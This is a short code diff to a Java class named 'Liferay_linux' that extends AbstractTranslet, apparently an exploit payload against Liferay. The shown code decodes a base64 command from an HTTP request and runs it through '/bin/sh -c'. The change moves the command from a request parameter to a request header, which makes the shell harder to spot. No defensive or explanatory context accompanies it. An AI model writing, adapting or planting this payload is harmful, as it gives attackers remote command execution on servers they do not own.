@@ -33,7 +33,7 @@ public class Liferay_linux extends AbstractTranslet implements Serializable {
 
 
             // exexute shell to base64
-            String params = new String(DatatypeConverter.parseBase64Binary(httprequest.getParameter("c")));
+            String params = new String(DatatypeConverter.parseBase64Binary(httprequest.getHeader("c")));
 
             InputStream in = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", params}).getInputStream();
 
